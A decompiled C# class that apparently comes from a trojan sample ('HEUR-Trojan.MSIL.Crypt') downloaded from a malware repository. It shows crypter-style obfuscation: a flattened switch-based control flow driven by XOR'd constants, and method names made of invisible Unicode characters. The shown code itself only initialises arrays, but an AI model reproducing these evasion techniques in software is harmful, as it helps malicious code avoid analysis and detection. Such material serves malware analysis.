// Decompiled with JetBrains decompiler
// Type: SMALLR.Adapter.RegInstanceAdapter
// Assembly: SMALLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D2A6844-DF52-4C3E-A39E-6BCAB729CFBF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-cb64837983ad6cdbc07df3dc8272a72b4d1b41314b797cc4f9bb67cd37f7b0f5.exe

using SMALLR.Messages;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SMALLR.Adapter
{
  public class RegInstanceAdapter : PagePolicyMessage
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public RegInstanceAdapter(Image spec, Size pol)
      : base(spec, pol)
    {
label_1:
      int num1 = -1027069559;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1215121659)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            List<int[,]> numArrayList1 = new List<int[,]>();
            List<int[,]> numArrayList2 = numArrayList1;
            int[,] numArray1 = new int[2, 3];
            // ISSUE: field reference
            RegInstanceAdapter.\u202A‏⁯‏‭‎⁫⁬⁪‍‍‪⁪‏​‌‏‪‏‪‌‌‮⁮‪⁮‮‭‬⁫‎⁪⁮⁭‪‌⁪‫⁯‏‮((Array) numArray1, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0034E6348E4AFAF7A3C97191DFCF7C7D1F3BA4D108A2DDF22DF9101655EC1C38FC3));
            numArrayList2.Add(numArray1);
            List<int[,]> numArrayList3 = numArrayList1;
            int[,] numArray2 = new int[3, 2];
            // ISSUE: field reference
            RegInstanceAdapter.\u202A‏⁯‏‭‎⁫⁬⁪‍‍‪⁪‏​‌‏‪‏‪‌‌‮⁮‪⁮‮‭‬⁫‎⁪⁮⁭‪‌⁪‫⁯‏‮((Array) numArray2, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0034DDEF15BDDABC95B1450C20F75496E342D5F96DF3E40723990DF68C40AC6815F));
            numArrayList3.Add(numArray2);
            this.DestroyAttr(numArrayList1);
            num1 = (int) num2 * -2047574389 ^ 60272709;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 27841406 ^ 1329788679;
            continue;
          case 4:
            num1 = (int) num2 * -813974754 ^ -536356844;
            continue;
          case 5:
            num1 = (int) num2 * -1641402937 ^ 1365030523;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    internal static bool AddPrototype() => true;

    internal static bool IncludePrototype() => false;

    static void \u202A‏⁯‏‭‎⁫⁬⁪‍‍‪⁪‏​‌‏‪‏‪‌‌‮⁮‪⁮‮‭‬⁫‎⁪⁮⁭‪‌⁪‫⁯‏‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);
  }
}
